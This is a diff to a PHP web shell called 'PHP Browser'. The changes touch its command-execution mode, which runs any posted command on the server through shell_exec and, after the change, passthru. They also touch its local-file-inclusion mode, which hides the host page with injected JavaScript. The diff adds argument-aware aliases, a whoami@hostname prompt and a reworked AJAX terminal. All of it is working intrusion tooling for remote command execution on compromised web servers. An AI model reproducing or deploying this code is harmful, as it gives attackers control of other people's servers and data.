@@ -24,7 +24,13 @@ define('SCRIPT_NAME', str_replace('\\', '/', $_SERVER['SCRIPT_NAME']));
 define('DIR', (isset($_GET['d']) ? $_GET['d'] : (isset($_POST['d']) ? $_POST['d'] : '.')));
 define('IS_LFI_BASED', (basename(__FILE__) == basename($_SERVER['SCRIPT_NAME'])) ? false : true);
 define('MODE', (isset($_GET['mode']) ? $_GET['mode'] : (isset($_POST['mode']) ? $_POST['mode'] : 'browser')));
-//date_default_timezone_set('UTC');
+
+if (function_exists(date_default_timezone_get()))         $TZ = date_default_timezone_get();
+elseif (strlen(ini_get('date.timezone')))                 $TZ = ini_get('date.timezone');
+elseif (IS_WIN == false AND file_exists('/etc/timezone')) $TZ = file_get_contents('/etc/timezone');
+else                                                      $TZ = 'UTC';
+
+@date_default_timezone_set($TZ);
 
 if (isset($_GET['genimg']) && !empty($_GET['genimg']))
 {
@@ -41,11 +47,12 @@ if (AUTHENT == true and !isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_A
 
 /* For LFI-based usage, hide previous page output */
 $html_header = '';
+
 if (IS_LFI_BASED)
 	$html_header .= '<script>document.getElementsByTagName("body")[0].innerHTML="";</script>';
+
 $html_header .= '<html><head><title>PHP Browser</title></head><body>';
 $html_footer = '<body></html>';
-//print_r($_SERVER);
 
 $system_drives = IS_WIN ? system_drives() : '';
 $lf = "\n";
@@ -201,13 +208,13 @@ if (MODE == 'shell')
 		else
 		{
 			/* Somes aliases */
-			switch ($_POST['cmd'])
+			switch (strtok($_POST['cmd'], ' '))
 			{
-				case 'l': $cmd = 'ls -l'; break ;
-				case 'la': $cmd = 'ls -la'; break ;
+				case 'l': $cmd = 'ls -lh '. strtok(' '); break ;
+				case 'la': $cmd = 'ls -la '. strtok(' '); break ;
 				default: $cmd = $_POST['cmd']; break ;
 			}
-			$cmd_output = shell_exec($cmd .' 2>&1');
+			$cmd_output = passthru($cmd .' 2>&1');
 			$cmd_output = strtr($cmd_output, array(chr(255) => ' ', chr(244) => 'ô', chr(224) => 'à', chr(195) => 'é', chr(130) => 'é', chr(233) => 'é', chr(160) => ' '));
 			echo $cmd_output;
 		}
@@ -215,24 +222,34 @@ if (MODE == 'shell')
 	}
 	
 	$uri = (IS_WIN ? str_replace('\\', '/', $_SERVER['SCRIPT_NAME']) : $_SERVER['SCRIPT_NAME']) . '?mode=shell' . build_params('mode');
-	$prompt_suffix = IS_WIN ? '>' : '&nbsp;$';
+	$prompt_prefix = IS_WIN ? '' : exec('whoami') .'@'. exec('hostname') .' ';
+	$prompt_suffix = IS_WIN ? '> ' : ' $ ';
 
-	echo $html_header . '<style>*{background-color: #333;} body {overflow: hidden;} #vshell_output {width: 800px;height: 350px;background-color: #333;color: #fff;border: 0;margin-bottom: -1px;}
-	#vshell_cmd {width: 800px;height: 20px;display: block;border: 0;background-color: #333;color: #fff;margin: 0;padding-left: 5px;}
-	.text{ font-family: "Lucida Console", "Courrier New", monospace, sans-serif; font-size: 11px; color: #fff; }</style>
-	<textarea readonly="readonly" name="vshell_output" id="vshell_output" class="text" style="resize: none; width: 100%; height: 95%;"></textarea>
-	<table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td style="white-space: nowrap;"><span class="text" id="prompt"></span></td><td width="100%">
-	<input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event)" style="width: 100%; resize: none;" class="text" /></td></tr></table>
-
+	echo $html_header . '<style>* {background-color: #333;}html,body {overflow: hidden;margin:0;}
+	#vshell_output {width:100%;height:-moz-calc(100% - 20px);height:-webkit-calc(100% - 20px);height:-o-calc(100% - 20px);height:calc(100% - 20px);background-color:#333;border:none;margin:0 0 -1px 0;padding:3px 0 0 0;outline:none;resize:none;overflow-y:scoll;}
+	#vshell_prompt{float:left;line-height:20px;}
+	#vshell_cmdline{overflow:hidden;padding-left:4px;}
+	#vshell_prompt,#vshell_cmd{border:none;outline:none;resize:none;}
+	.text {font-family:"Lucida Console","Courrier New",monospace,sans-serif;font-size:11px;color:#fff;}</style>
+	
+	<textarea readonly="readonly" name="vshell_output" id="vshell_output" class="text" onclick="document.getElementById(\'vshell_cmd\').focus();"></textarea>
+	<div id="vshell_container" class="text"><div id="vshell_prompt" class="text"></div><div id="vshell_cmdline" class="text"><input type="text" name="vshell_cmd" id="vshell_cmd" onKeyPress="checkEnter(event);" class="text" /></div></div>
+	
 	<script type="text/javascript">
+	var vp = document.getElementById(\'vshell_prompt\');
+	var ta = document.getElementById(\'vshell_output\');
+	var tcmd = document.getElementById(\'vshell_cmd\');
+
 	function ReadCookie(name) { var parts = document.cookie.split(/;\s*/); for (var i=0;i<parts.length;i++)	{ if (parts[i].substring(0, 3) == name+"=") return atob(unescape(parts[i].substring(3))); } }
-	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { cmd = document.getElementById(\'vshell_cmd\').value; if (cmd == "exit") window.close(); else postMethod(cmd); return true; } else return false; }
-	function updatePrompt()   { document.getElementById(\'prompt\').innerHTML = ReadCookie(\'cs\') + "'. $prompt_suffix .' "; }
+	function checkEnter(e)    { var key; if (window.event)	key = window.event.keyCode; else key = e.which; if (key == 13) { if (tcmd.value == "exit") window.close(); else postMethod(tcmd.value); return true; } else return false; }
+	function updatePrompt()   { vp.innerHTML = "'. $prompt_prefix .'" + ReadCookie(\'cs\') + "'. $prompt_suffix .'"; }
 	function getHTTPObject()  { var http = false; if (typeof ActiveXObject != \'undefined\') {try { http = new ActiveXObject("Msxml2.XMLHTTP"); } catch (e) { try { http = new ActiveXObject("Microsoft.XMLHTTP"); }	catch (E) { http = false;}}} else if (XMLHttpRequest) { try { http = new XMLHttpRequest(); }	catch (e) {http = false;}} return http;	}
-	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); var ta = document.getElementById(\'vshell_output\'); var tcmd = document.getElementById(\'vshell_cmd\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "$ "+ cmd + "\n" + http.responseText; ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
+	function postMethod(cmd)  { var http = getHTTPObject(); var params = "cmd="+ cmd.replace(\'+\',\'%2b\'); http.open("POST", "'. $uri .'", true); http.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+								http.setRequestHeader("Content-length", params.length); http.setRequestHeader("Connection", "close"); http.onreadystatechange = function() { if (http.readyState == 4 && http.status == 200) { ta.value += "'. $prompt_prefix .'" + ReadCookie(\'cs\') + "'. $prompt_suffix .'"+ cmd + "\n" + http.responseText;
+								ta.scrollTop = ta.scrollHeight; tcmd.value=""; updatePrompt() } }; http.send(params); }
 	
 	updatePrompt();
-	document.getElementById(\'vshell_cmd\').focus();
+	tcmd.focus();
 	</script>';
 
 	echo $html_footer;
